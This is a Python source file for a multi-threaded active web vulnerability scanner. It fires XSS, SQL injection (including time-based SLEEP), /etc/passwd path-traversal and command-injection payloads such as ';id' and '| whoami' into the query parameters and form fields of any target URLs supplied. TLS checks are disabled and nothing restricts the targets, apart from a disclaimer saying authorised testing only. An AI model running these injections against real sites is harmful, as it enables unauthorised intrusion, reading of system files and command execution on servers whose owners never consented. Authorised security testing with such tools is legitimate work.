#!/usr/bin/env python3
"""
KRD - Ultra Web Vulnerability Scanner (Advanced Edition)
-------------------------------------------------------
Author   : Aland
Version  : 3.3 - 2025-07-10
Purpose  : Multi-threaded active scanner for common web application vulnerabilities.

Highlights (v3.3)
=================
* Re‑added **run()** in a safe form and exported via `__all__` so external GUIs can import it.
* Fixed all previous cut‑off / unterminated strings by completing the tail of the file.
* Plain ASCII banner and dashes to avoid encoding errors.
* No functional changes to scanning logic.

Disclaimer: For educational and authorised testing only.
"""

from __future__ import annotations
import argparse
import concurrent.futures as cf
import json
import re
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, List, Sequence, Tuple
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse

import requests
from bs4 import BeautifulSoup

# =====================================
# Static Configuration
# =====================================
HEADERS = {
    "User-Agent": "KaliGPT-AdvScanner/3.3 (+https://github.com/yourrepo)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}
DEFAULT_TIMEOUT = 8  # seconds
THREADS = 10
TIME_SLOW_THRESHOLD = 6.0  # seconds over baseline for time‑based SQLi
DB_ERRORS = re.compile(
    r"(you have an error in your sql syntax|warning: mysql|unclosed quotation mark|quoted string not properly terminated|pg_query|ORA-|SQLITE_ERROR)",
    re.I,
)

# =====================================
# Payload Templates (extend as needed)
# =====================================
TEMPLATES: Dict[str, Sequence[str]] = {
    "XSS": [
        "<script>alert(1337)</script>",
        "\"<svg/onload=confirm(1)>",
        "'\"><img src=x onerror=alert(1)>",
    ],
    "SQLi": [
        "' OR 1=1-- ",
        "\" OR \"1\"=\"1\"-- ",
        "admin'--",
        "' OR SLEEP(#{delay})#",
    ],
    "LFI": [
        "../../../../etc/passwd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    ],
    "RCE": [
        ";id",
        "| whoami",
    ],
}

# =====================================
# Dataclass
# =====================================
@dataclass
class Finding:
    category: str
    url: str
    param: str
    payload: str
    evidence: str = ""

    def asdict(self) -> Dict[str, str]:
        return {
            "category": self.category,
            "url": self.url,
            "parameter": self.param,
            "payload": self.payload,
            "evidence": self.evidence,
        }

# =====================================
# Helper Functions
# =====================================

def log(msg: str, level: str = "INFO") -> None:
    prefix = {
        "INFO": "[*]",
        "OK": "[+]",
        "WARN": "[!]",
        "ERR": "[x]",
    }.get(level, "[*]")
    print(f"{prefix} {msg}")


def normalize_url(raw: str) -> str:
    """Ensure URL has a scheme. Prefer HTTPS."""
    return raw if raw.startswith(("http://", "https://")) else "https://" + raw.lstrip("/")


def send_request(session: requests.Session, method: str, url: str, **kwargs) -> Tuple[requests.Response | None, float]:
    """Make a request with graceful HTTPS<->HTTP fallback."""
    start = time.perf_counter()
    try:
        res = session.request(method, url, timeout=DEFAULT_TIMEOUT, allow_redirects=True, verify=False, **kwargs)
        return res, time.perf_counter() - start
    except Exception:
        alt = url.replace("https://", "http://", 1) if url.startswith("https://") else url.replace("http://", "https://", 1)
        if alt != url:
            try:
                res = session.request(method, alt, timeout=DEFAULT_TIMEOUT, allow_redirects=True, verify=False, **kwargs)
                log(f"Retrying with alternate scheme: {alt}", "WARN")
                return res, time.perf_counter() - start
            except Exception:
                pass
        return None, 0.0


def replace_param(url: str, key: str, payload: str) -> str:
    """Replace a single query‑string parameter value with payload."""
    parsed = urlparse(url)
    qs = parse_qsl(parsed.query, keep_blank_values=True)
    new_qs = [(k, payload if k == key else v) for k, v in qs]
    return urlunparse(parsed._replace(query=urlencode(new_qs, doseq=True, safe="/:@")))


def enumerate_params(url: str) -> List[str]:
    return [k for k, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)]


def extract_forms(url: str, session: requests.Session) -> List[Tuple[str, str, List[str]]]:
    """Scrape forms and return (action_url, method, input_names)."""
    out: List[Tuple[str, str, List[str]]] = []
    try:
        r = session.get(url, headers=HEADERS, timeout=DEFAULT_TIMEOUT, verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        for form in soup.find_all("form"):
            action = form.get("action") or url
            action_url = urljoin(url, action)
            method = (form.get("method") or "get").lower()
            names = [i.get("name") for i in form.find_all(["input", "textarea"]) if i.get("name")]
            out.append((action_url, method, names))
    except Exception:
        pass
    return out

# =====================================
# Core Scanning Logic
# =====================================

def assess(cat: str, payload: str, resp: requests.Response | None, baseline: str, elapsed: float) -> bool:
    if resp is None:
        return False
    body = resp.text or ""
    if cat == "XSS" and (payload.lower() in body.lower() or re.escape(payload) in body):
        return True
    if cat == "SQLi":
        if DB_ERRORS.search(body):
            return True
        if "sleep(" in payload.lower() and elapsed > TIME_SLOW_THRESHOLD:
            return True
    return payload in body


def scan_target(url: str, categories: Sequence[str]) -> List[Finding]:
    session = requests.Session(); session.headers.update(HEADERS)
    log(f"Scanning {url}")
    baseline_resp, _ = send_request(session, "GET", url)
    baseline_body = baseline_resp.text if baseline_resp else ""
    params = enumerate_params(url)
    findings: List[Finding] = []

    # Query params / direct injection
    for cat in categories:
        for payload in TEMPLATES[cat]:
            actual = payload.replace("#{delay}", str(int(TIME_SLOW_THRESHOLD)))
            if params:
                for p in params:
                    test = replace_param(url, p, actual)
                    resp, el = send_request(session, "GET", test)
                    if assess(cat, actual, resp, baseline_body, el):
                        findings.append(Finding(cat, test, p, actual))
            else:
                glue = "&" if "?" in url else "?"
                test = f"{url}{glue}krd={actual}"
                resp, el = send_request(session, "GET", test)
                if assess(cat, actual, resp, baseline_body, el):
                    findings.append(Finding(cat, test, "krd", actual))

    # Forms
    for action, method, names in extract_forms(url, session):
        for cat in categories:
            for payload in TEMPLATES[cat]:
                data = {n: payload for n in names} or {"krd": payload}
                resp, el = send_request(session, method.upper(), action, data=data)
                if assess(cat, payload, resp, baseline_body, el):
                    findings.append(Finding(cat, action, ",".join(names) or "krd", payload))
    return findings

# =====================================
# CLI Orchestrator
# =====================================

def main(argv: Sequence[str] | None = None) -> None:
    parser = argparse.ArgumentParser(description="KRD Advanced Web Vulnerability Scanner")
    src = parser.add_mutually_exclusive_group(required=True)
    src.add_argument("-u", "--url", action="append", help="Target URL (can be used multiple times)")
    src.add_argument("-f", "--file", type=Path, help="File with URL list (one per line)")
    parser.add_argument("-t", "--threads", type=int, default=THREADS, help="Concurrent threads (default 10)")
    parser.add_argument("-c", "--categories", default=",".join(TEMPLATES.keys()), help="Comma-separated vulnerability categories to scan")
    parser.add_argument("-o", "--output", type=Path, help="Save findings to JSON file")
    args = parser.parse_args(argv)

    targets = args.url or [l.strip() for l in args.file.read_text().splitlines() if l.strip() and not l.startswith("#")]
    targets = [normalize_url(t) for t in targets]
    cats = [c.strip() for c in args.categories.split(",") if c.strip() in TEMPLATES]
    if not cats:
        log("No valid categories selected!", "ERR"); sys.exit(1)

    all_findings: List[Finding] = []
    with cf.ThreadPoolExecutor(max_workers=args.threads) as pool:
        for fut in cf.as_completed({pool.submit(scan_target, url, cats): url for url in targets}):
            all_findings.extend(fut.result())

    if all_findings:
        log(f"\n[+] Vulnerabilities Detected: {len(all_findings)}", "OK")
        for f in all_findings:
            log(f"{f.category} at {f.url} param={f.param}", "OK")
        if args.output:
            args.output.write_text(json.dumps([f.asdict() for f in all_findings], indent=2))
            log(f"Results saved to {args.output}")
    else:
        log("No vulnerabilities found.")
    log("Scan finished!", "INFO")

# =====================================
# Interactive Wrapper for GUIs
# =====================================

def run() -> None:
    """Interactive single‑target scan (legacy convenience)"""
    try:
        print("-" * 47)
        print("|  KRD Ultra Web Vuln Scanner (interactive)  |")
        print("-" * 47)
        target_in = input("🌐 Enter target URL (e.g. testphp.vulnweb.com): ").strip()
        target = normalize_url(target_in)
        findings = scan_target(target, list(TEMPLATES.keys()))
        if findings:
            log(f"\n[+] Vulnerabilities Detected: {len(findings)}", "OK")
            for f in findings:
                log(f"{f.category} at {f.url} param={f.param}", "OK")
        else:
            log("No vulnerabilities found.")
        log("Scan finished!", "INFO")
    except KeyboardInterrupt:
        log("Interrupted by user", "WARN")

# Symbols expected by importers
__all__ = ["main", "run", "scan_target"]

# =====================================
# Module Entrypoint
# =====================================
if __name__ == "__main__":
    if len(sys.argv) == 1:
        run()
    else:
        main()
